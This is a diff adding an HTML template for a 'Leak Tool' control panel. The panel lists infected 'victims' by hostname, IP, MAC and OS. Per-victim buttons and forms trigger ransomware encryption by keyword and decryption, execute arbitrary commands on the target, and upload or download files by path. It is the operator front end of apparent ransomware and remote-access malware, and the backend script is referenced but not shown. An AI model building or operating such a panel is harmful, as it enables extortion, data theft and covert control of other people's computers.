@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Leak Tool</title>
+  <link rel="stylesheet" href="staticfiles/style.css">
+  <script src="https://kit.fontawesome.com/0ba84bc1c4.js" crossorigin="anonymous"></script>
+</head>
+
+<body>
+  <!-- HTML code for the rest of the page (header, table, etc.) -->
+  <h1>Leak Tool</h1>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Hostname</th>
+        <th>IP</th>
+        <th>MAC</th>
+        <th>OS</th>
+        <th></th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for mac in victims %}
+      {% set deviceName = victims[mac]['name'] %}
+      {% set deviceIP = victims[mac]['ip'] %}
+      {% set deviceOS = victims[mac]['os'] %}
+      <tr>
+        <td>
+          {% if deviceName == deviceIP %}
+          -
+          {% else %}
+          {{deviceName}}
+          {% endif %}
+        </td>
+        <td>{{deviceIP}}</td>
+        <td>{{mac}}</td>
+        <td>{{deviceOS}}</td>
+        <td>
+          <button class="operationButton"
+            onclick="openRansomwareEncModal('{{deviceName}}', '{{mac}}', '{{deviceIP}}')"><i
+              class="fas fa-regular fa-lock"></i></button>
+          <button class="operationButton"
+            onclick="openRansomwareDecModal('{{deviceName}}', '{{mac}}', '{{deviceIP}}')"><i
+              class="fas fa-regular fa-lock-open"></i></button>
+          <button class="operationButton" onclick="openCommandModal('{{deviceName}}', '{{mac}}', '{{deviceIP}}')"><i
+              class="fas fa-solid fa-terminal"></i></button>
+          <button class="operationButton" onclick="openSendFileModal('{{deviceName}}', '{{mac}}', '{{deviceIP}}')"><i
+              class="fas fa-regular fa-file-arrow-up"></i></button>
+          <button class="operationButton" onclick="openRecvFileModal('{{deviceName}}', '{{mac}}', '{{deviceIP}}')"><i
+              class="fas fa-regular fa-file-arrow-down"></i></button>
+        </td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+
+  <!-- Response Modal -->
+  <div id="response_modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">Response: <span id="operation_result" style="font-weight: 100;"></span></h2>
+        <span class="close-button" onclick="closeModal()">&times;</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Encryption Modal -->
+  <div id="encryption_modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">Target: <span style="font-weight: 100;" class="selecteddevice"></span></h2>
+        <span class="close-button" onclick="closeModal()">&times;</span>
+      </div>
+      <div class="modal-buttons">
+        <form id="encryption_form">
+          <input style="display: none;" id="IP_input_1" type="text" name="ip" value="">
+          <input type="text" placeholder="Use ',' as seperator" name="keywords">
+          <button>Encrypt</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Decryption Modal -->
+  <div id="decryption_modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">Target: <span style="font-weight: 100;" class="selecteddevice"></span></h2>
+        <span class="close-button" onclick="closeModal()">&times;</span>
+      </div>
+      <div class="modal-buttons">
+        <form id="decryption_form">
+          <input style="display: none;" id="IP_input_2" type="text" name="ip" value="">
+          <button>Decrypt</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- Command Modal -->
+  <div id="command_modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">Target: <span style="font-weight: 100;" class="selecteddevice"></span></h2>
+        <span class="close-button" onclick="closeModal()">&times;</span>
+      </div>
+      <div class="modal-buttons">
+        <form id="command_form">
+          <input style="display: none;" id="IP_input_3" type="text" name="ip" value="">
+          <input type="text" placeholder="Enter a command" name="command">
+          <button>Execute</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- File Send Modal -->
+  <div id="file_send_modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">Target: <span style="font-weight: 100;" class="selecteddevice"></span></h2>
+        <span class="close-button" onclick="closeModal()">&times;</span>
+      </div>
+      <div class="modal-buttons">
+        <form id="fsend_form">
+          <input style="display: none;" id="IP_input_4" type="text" name="ip" value="">
+          <input type="text" placeholder="Enter a file path" name="filePath">
+          <button>Send</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <!-- File Recieve Modal -->
+  <div id="file_recv_modal" class="modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title">Target: <span style="font-weight: 100;" class="selecteddevice"></span></h2>
+        <span class="close-button" onclick="closeModal()">&times;</span>
+      </div>
+      <div class="modal-buttons">
+        <form id="frecv_form">
+          <input style="display: none;" id="IP_input_5" type="text" name="ip" value="">
+          <input type="text" placeholder="Enter a file path" name="filePath">
+          <button>Recieve</button>
+        </form>
+      </div>
+    </div>
+  </div>
+</body>
+<script src="staticfiles/app.js"></script>
+</html>
